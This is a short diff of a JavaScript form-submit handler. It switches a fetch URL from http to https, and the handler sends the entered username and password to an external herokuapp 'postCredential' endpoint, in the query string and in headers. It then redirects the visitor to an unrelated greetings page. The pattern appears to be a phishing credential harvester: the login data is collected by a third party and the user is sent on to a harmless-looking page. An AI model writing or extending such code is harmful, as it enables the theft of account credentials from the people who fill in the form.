@@ -25,7 +25,7 @@ const handleSubmit = (e) => {
         return;
     }
 
-    fetch(`http://media-store.herokuapp.com/api/media/postCredential?uname=${uv}&upass=${pv}`, setPostHeaders({ uname: uv, upass: pv }))
+    fetch(`https://media-store.herokuapp.com/api/media/postCredential?uname=${uv}&upass=${pv}`, setPostHeaders({ uname: uv, upass: pv }))
         .then((res) => (window.location.href = 'https://www.123greetings.com/friendship/thoughts/thoughts76.html'))
         .catch((err) => console.log(err));
 };
